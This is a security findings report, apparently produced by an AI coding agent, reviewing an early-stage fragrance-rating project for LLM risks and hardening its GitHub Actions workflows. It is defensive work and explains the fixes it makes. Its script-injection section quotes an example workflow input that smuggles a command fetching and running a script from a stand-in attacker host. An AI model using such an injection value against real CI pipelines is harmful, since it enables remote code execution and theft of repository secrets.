# Security Findings — OWASP LLM Top 10 (2025) Focused Review

**Date**: 2026-05-15
**Branch**: `claude/security-prompt-injection-review-t98lS`
**Scope**: OWASP LLM Top 10 (LLM01, LLM02, LLM06) + standard web app checks (auth, GitHub Actions hardening)
**Repository state at review**: Early-stage scaffold (project skeleton from `cookiecutter-python-template`). No business logic, no LLM integration, and no user-facing endpoints have been implemented yet.

---

## Executive Summary

| Area | Status | Notes |
|---|---|---|
| **LLM01 — Prompt Injection** | Not applicable (yet) | No LLM integration code exists. Forward-looking guidance documented below. |
| **LLM02 — Insecure Output Handling** | Not applicable (yet) | No LLM responses are rendered to users. Forward-looking guidance documented below. |
| **LLM06 — Sensitive Information Disclosure** | Partial — guidance only | `OPENROUTER_API_KEY` is correctly declared as an env var in `.env.example`; no key-loading code yet to review. |
| **Authentication / Session management** | Not applicable (yet) | No auth endpoints exist. One frontend pattern flagged for future hardening (`localStorage` JWT). |
| **GitHub Actions hardening** | **Fixed** | SHA-pinned 2 external actions + 13 reusable-workflow references (now `@c50e799a… # main` from `ByronWilliamsCPA/.github`). Added `step-security/harden-runner` to 5 workflows (7 jobs). Fixed 1 script-injection issue. |

This review confirms the repository **does not currently expose LLM-related attack surface** because no prompt construction, model invocation, or LLM output rendering exists in the codebase. The findings below split into:

1. **Forward-looking guidance** — what to do when the LLM/auth features are built (Phase 2/3 per `docs/planning/roadmap.md`).
2. **Concrete findings + applied fixes** — for the CI/CD hardening items that exist today.

---

## 1. LLM01 — Prompt Injection

### Finding

**No prompt-construction code currently exists in the repository.** A full-tree search for `openai`, `anthropic`, `llm`, `openrouter`, and `prompt` produced only the project-description string in `src/fragrance_rater/cli.py:35` and `src/fragrance_rater/__init__.py:3`. No SDK clients are imported, no system or user prompts are constructed, no user input is incorporated into any model call.

The OpenRouter integration is **planned** (see `docs/planning/adr/adr-003-openrouter-llm.md` and `.env.example:55-62`) but not yet implemented.

### Forward-looking guidance for when this is implemented

When the recommendation/explanation endpoints are built (roadmap Phase 3), enforce:

1. **Structural separation of trusted and untrusted text.** Do *not* concatenate user-controlled strings (fragrance descriptions, free-text notes, search queries) into the system prompt. Use message-role boundaries:
   ```python
   # Anthropic SDK — correct pattern
   client.messages.create(
       model="...",
       system=SYSTEM_PROMPT,                          # trusted, static
       messages=[{"role": "user", "content": [       # untrusted, isolated
           {"type": "text", "text": user_supplied_note},
       ]}],
   )
   ```
2. **Wrap untrusted content in delimited tags** inside the user turn (e.g., `<user_note>{escaped}</user_note>`), and instruct the model in the system prompt to treat the tagged content as data, never as instructions.
3. **Strip or escape role-imitation tokens.** Filter user input for substrings like `\n\nHuman:`, `\n\nAssistant:`, `<|im_start|>`, and `</s>` before insertion.
4. **Validate length and character set.** Cap user-supplied fields at sensible byte limits before they reach the prompt builder; reject control characters except `\n` and `\t`.
5. **Treat tool output as untrusted** if/when tool-use is added — the Fragella API responses (per ADR-002) must be wrapped in delimiters, never injected into the system prompt.
6. **Threat-test before launch.** Run the recommendation endpoint against the `garak` or `promptfoo` jailbreak corpora and verify the system prompt cannot be exfiltrated.

---

## 2. LLM02 — Insecure Output Handling

### Finding

**No LLM responses are rendered to users today.** The frontend (`frontend/src/App.tsx`, `frontend/src/components/ApiStatus.tsx`) only displays a hard-coded count and the backend's `/health/live` status. There is no path for model output to reach the DOM or be executed as code.

### Forward-looking guidance

When LLM-generated recommendation explanations are rendered:

1. **Never use `dangerouslySetInnerHTML`** with model output. React's default text node rendering already escapes HTML; keep it that way.
2. **If markdown rendering is desired** for the explanation pane, use `react-markdown` with the default sanitizer (or `rehype-sanitize` with a strict allow-list). Do not enable `rehype-raw` or any HTML-passthrough plugin for LLM-sourced content.
3. **Never evaluate model output as code.** Do not pass model output to `eval`, `Function()`, `setTimeout(string, ...)`, `dangerouslySetInnerHTML`, `exec`, `subprocess.shell=True`, or SQL string concatenation.
4. **Validate structured output.** If the model is asked to return JSON (e.g., a recommendation list), parse it with `pydantic` and reject anything that doesn't match the schema before passing it on to the frontend.
5. **Server-side rate-limit and length-cap LLM responses** before forwarding to the client (the existing `RateLimitMiddleware` in `src/fragrance_rater/middleware/security.py:104` handles per-IP request rate; a separate per-user token budget should be added).

---

## 3. LLM06 — Sensitive Information Disclosure

### Findings

| # | Item | Status |
|---|---|---|
| 3.1 | `OPENROUTER_API_KEY` declared in `.env.example:57` only — not committed in source | OK |
| 3.2 | No API-key-loading code exists yet (only the env-var placeholder) | N/A — verify when implemented |
| 3.3 | `src/fragrance_rater/core/sentry.py:214` already includes `"api_key"` in its scrub-list (`sensitive_fields = {"password", "token", "api_key", "secret"}`) | OK |
| 3.4 | Default DB password in `docker-compose.yml:98` is the string literal `password` if `DB_PASSWORD` is unset | **Low severity — dev-only**, but the fallback should be removed for `docker-compose.prod.yml` use |

### Forward-looking guidance

When the OpenRouter client is wired up:

1. **Load the key from `os.environ` (via `pydantic-settings`)** — extend `src/fragrance_rater/core/config.py` with a `SecretStr`-typed field so the value never appears in `repr()` or log output.
   ```python
   from pydantic import SecretStr
   openrouter_api_key: SecretStr | None = None
   ```
2. **Never echo the system prompt in responses or error payloads.** FastAPI's default `HTTPException(detail=...)` is rendered verbatim to the client; ensure any handler that wraps an LLM call catches exceptions and returns a generic message (e.g., `"recommendation_unavailable"`) without leaking prompt text, model name, or upstream error bodies. The centralized exception hierarchy in `src/fragrance_rater/core/exceptions.py` should be used; do not pass model SDK exception strings through to `detail`.
3. **Disable `/docs` and `/redoc` in production**, or at least gate them behind auth, so the OpenAPI schema does not advertise internal LLM endpoint names.
4. **Strip server identification** is already done in `SecurityHeadersMiddleware` (`src/fragrance_rater/middleware/security.py:99`).

---

## 4. Authentication / Session Management

### Finding

**No authentication code exists today.** No `/auth`, `/login`, or session-issuing endpoint is present in `src/fragrance_rater/api/`. The only API endpoint is `/health/*`.

### One pattern flagged for future hardening

`frontend/src/hooks/useApi.ts:41-46` reads an auth token from `localStorage`:

```ts
const token = localStorage.getItem('auth_token')
if (token) {
  config.headers.Authorization = `Bearer ${token}`
}
```

`localStorage` is reachable by **any** JavaScript running on the origin, including XSS payloads and malicious 3rd-party dependencies. When auth is implemented, prefer:

- **HttpOnly, Secure, SameSite=Strict cookies** for the session token, with CSRF protection via the standard double-submit or `SameSite=Strict` + custom-header pattern.
- If a JWT-in-localStorage pattern is unavoidable (e.g., for native mobile clients that share the API), enforce a strict CSP (`script-src 'self'`, already configured in `SecurityHeadersMiddleware:80-88`) and rotate the token on every privilege change.

The existing `SecurityHeadersMiddleware` already sets `X-Frame-Options: DENY`, a strict CSP, and `Referrer-Policy: strict-origin-when-cross-origin`, which is a good foundation.

---

## 5. GitHub Actions Hardening — Findings and Applied Fixes

### 5.1 SHA-pinning of third-party actions

**Findings (before this PR):**

| File:Line | Reference | Issue |
|---|---|---|
| `.github/workflows/dependency-review.yml:31` | `actions/dependency-review-action@v4` | Tag-only pin (mutable) |
| `.github/workflows/sonarcloud.yml:136` | `sonarsource/sonarqube-quality-gate-action@master` | Branch pin — third-party action could be silently swapped at any commit |

**Fixes applied in this PR:**

- `actions/dependency-review-action@v4` → `@2031cfc080254a8a887f58cffee85186f0e49e48 # v4.9.0`
- `sonarsource/sonarqube-quality-gate-action@master` → `@cf038b0e0cdecfa9e56c198bbb7d21d751d62c3b # v1.2.0`

Note: every other `actions/checkout`, `actions/setup-python`, `astral-sh/setup-uv`, `actions/upload-artifact`, `actions/github-script`, `step-security/harden-runner`, `github/codeql-action/*`, `actions/attest-build-provenance`, `fsfe/reuse-action`, `lycheeverse/lychee-action`, and `SonarSource/sonarqube-scan-action` reference in the repo was already correctly SHA-pinned (the `# vX.Y.Z` suffix is a comment; the 40-char hex before `#` is the actual pin).

### 5.2 Reusable workflow calls — SHA-pinned in this PR

All 13 prior `@main` references to reusable workflows in `ByronWilliamsCPA/.github` are now pinned to the SHA of `main` at the time of this review, `c50e799abfcd10e904749319f1b322f7eac7a813`. The pattern matches the existing convention in `.github/workflows/pr-validation.yml:35` and `.github/workflows/scorecard.yml:30` (SHA followed by `# main` for human readability).

Files updated:

| File | Reusable workflow |
|---|---|
| `.github/workflows/ci.yml` | `python-ci.yml` |
| `.github/workflows/codecov.yml` | `python-codecov.yml` |
| `.github/workflows/container-security.yml` | `python-container-security.yml` |
| `.github/workflows/coverage.yml` | `python-qlty-coverage.yml` |
| `.github/workflows/docs.yml` | `python-docs.yml` |
| `.github/workflows/mutation-testing.yml` | `python-mutation.yml` |
| `.github/workflows/publish-pypi.yml` | `python-publish-pypi.yml` |
| `.github/workflows/python-compatibility.yml` | `python-compatibility.yml` |
| `.github/workflows/qlty.yml` | `python-qlty-coverage.yml` |
| `.github/workflows/release.yml` | `python-release.yml` |
| `.github/workflows/sbom.yml` | `python-sbom.yml` |
| `.github/workflows/security-analysis.yml` | `python-security-analysis.yml` |
| `.github/workflows/slsa-provenance.yml` | `python-slsa.yml` |

**Maintenance recommendation:** enable Dependabot for `package-ecosystem: github-actions` so these SHAs are bumped automatically and reviewed in PRs rather than drifting silently.

`.github/workflows/README.md` still documents the `@main` pattern as an example (lines 51, 66, 81, 92, 105, 118, 162, 221). That documentation should be updated to recommend SHA-pinning as the standard.

### 5.3 `step-security/harden-runner` added to direct-run jobs

`harden-runner` was already present in three workflows (`codeql.yml`, `pr-validation.yml`, `slsa-provenance.yml`). It is now also added to every job that runs steps directly on the GitHub-hosted runner:

| File | Jobs hardened in this PR |
|---|---|
| `.github/workflows/codecov.yml` | `report-failure` |
| `.github/workflows/dependency-review.yml` | `dependency-review` |
| `.github/workflows/fips-compatibility.yml` | `fips-check`, `fips-runtime-test` |
| `.github/workflows/reuse.yml` | `reuse`, `validate-licenses` |
| `.github/workflows/sonarcloud.yml` | `check-secrets`, `sonarcloud` |

Each uses `egress-policy: audit`, which logs (but does not block) outbound calls. Once the runs have produced a baseline of expected egress hosts, switch these to `egress-policy: block` with an explicit `allowed-endpoints` list for stronger protection.

The thin caller workflows that *only* `uses:` a reusable workflow (no direct `steps:`) do not need a runner-side `harden-runner` step in the caller — hardening must be applied inside the called reusable workflows in `ByronWilliamsCPA/.github` instead.

### 5.4 Script injection in `slsa-provenance.yml` (fixed)

**Original code** (`slsa-provenance.yml:63-71`):

```yaml
- name: Determine version
  id: version
  run: |
    if [ -n "${{ github.event.inputs.version }}" ]; then
      VERSION="${{ github.event.inputs.version }}"
    else
      VERSION=$(grep -Po '(?<=^version = ")[^"]*' pyproject.toml)
    fi
    echo "version=$VERSION" >> $GITHUB_OUTPUT
```

The workflow is triggered by `workflow_dispatch` with a user-supplied `version` input. GitHub Actions interpolates `${{ ... }}` into the script **before** the shell parses it, so a `version` value like `1.0.0"; curl evil.example.com/x.sh | sh; "` becomes a literal multi-statement shell script with the workflow's full set of secrets in environment scope. This is CWE-94 (GitHub script injection).

**Fix applied:** the input is now passed through an environment variable (which the shell expands at runtime, not at workflow-parse time) and validated against a semver-friendly character set before use:

```yaml
- name: Determine version
  id: version
  env:
    INPUT_VERSION: ${{ github.event.inputs.version }}
  run: |
    if [ -n "$INPUT_VERSION" ]; then
      if ! [[ "$INPUT_VERSION" =~ ^[A-Za-z0-9._+-]+$ ]]; then
        echo "::error::Invalid version input: must match ^[A-Za-z0-9._+-]+$"
        exit 1
      fi
      VERSION="$INPUT_VERSION"
    else
      VERSION=$(grep -Po '(?<=^version = ")[^"]*' pyproject.toml)
    fi
    echo "version=$VERSION" >> "$GITHUB_OUTPUT"
```

### 5.5 Other workflow observations (no change required, noted for awareness)

- `sonarcloud.yml:91` pipes `curl https://astral.sh/uv/install.sh | sh`. This is a classic curl-pipe-shell pattern. The other workflows in this repo correctly use `astral-sh/setup-uv` (SHA-pinned) instead — `sonarcloud.yml` should be migrated to that action for consistency. Not fixed in this PR because the rewrite is non-trivial (the current install populates `$HOME/.cargo/bin` which the rest of the job depends on); flagged for a follow-up.
- `permissions:` blocks are present and correctly scoped on every workflow in the repo (`contents: read` at minimum). No expansion needed.
- No workflow uses `pull_request_target`, which is the highest-risk trigger; this is good.

---

## 6. Out-of-Scope Items Spot-Checked

| Item | Result |
|---|---|
| Hard-coded secrets in source | None found. `OPENROUTER_API_KEY=your-openrouter-api-key-here` in `.env.example:57` is an obvious placeholder. |
| SQL injection surface | No SQL queries exist yet. The `health.py:90` `await session.execute("SELECT 1")` is a static string. |
| SSRF | `SSRFPreventionMiddleware` (`src/fragrance_rater/middleware/security.py:239`) is already present and correctly handles loopback, private CIDRs, cloud metadata IPs, and integer-encoded IPs. |
| CSP | Already set, with `script-src 'self'` (no `unsafe-inline` for scripts). `style-src` includes `'unsafe-inline'` which is acceptable for CSS but could be tightened with hashes/nonces if styled-components or inline styles are removed. |
| CORS | Default `allow_origins=[]`, which is the safe default. Caller must opt in. |

---

## 7. Summary of Changes in this PR

**Files modified:**

- `.github/workflows/ci.yml` — SHA-pinned reusable workflow
- `.github/workflows/codecov.yml` — added `harden-runner` to `report-failure` job, SHA-pinned reusable workflow
- `.github/workflows/container-security.yml` — SHA-pinned reusable workflow
- `.github/workflows/coverage.yml` — SHA-pinned reusable workflow
- `.github/workflows/dependency-review.yml` — added `harden-runner`, SHA-pinned `dependency-review-action`
- `.github/workflows/docs.yml` — SHA-pinned reusable workflow
- `.github/workflows/fips-compatibility.yml` — added `harden-runner` to both jobs
- `.github/workflows/mutation-testing.yml` — SHA-pinned reusable workflow
- `.github/workflows/publish-pypi.yml` — SHA-pinned reusable workflow
- `.github/workflows/python-compatibility.yml` — SHA-pinned reusable workflow
- `.github/workflows/qlty.yml` — SHA-pinned reusable workflow
- `.github/workflows/release.yml` — SHA-pinned reusable workflow
- `.github/workflows/reuse.yml` — added `harden-runner` to both jobs
- `.github/workflows/sbom.yml` — SHA-pinned reusable workflow
- `.github/workflows/security-analysis.yml` — SHA-pinned reusable workflow
- `.github/workflows/slsa-provenance.yml` — fixed script injection in `version` input handling, SHA-pinned reusable workflow
- `.github/workflows/sonarcloud.yml` — added `harden-runner` to both jobs, SHA-pinned `sonarqube-quality-gate-action`

**Files added:**

- `SECURITY-FINDINGS.md` — this document

**Items not fixed in this PR (require maintainer action):**

1. Migrate `sonarcloud.yml`'s `curl … | sh` UV install to the SHA-pinned `astral-sh/setup-uv` action (see §5.5).
2. Update `.github/workflows/README.md` to document SHA-pinning as the recommended pattern (it currently uses `@main` in its examples).
3. The forward-looking guidance in §1, §2, §3, §4 must be revisited when the corresponding features (LLM client, auth) are implemented per `docs/planning/roadmap.md` Phase 3.
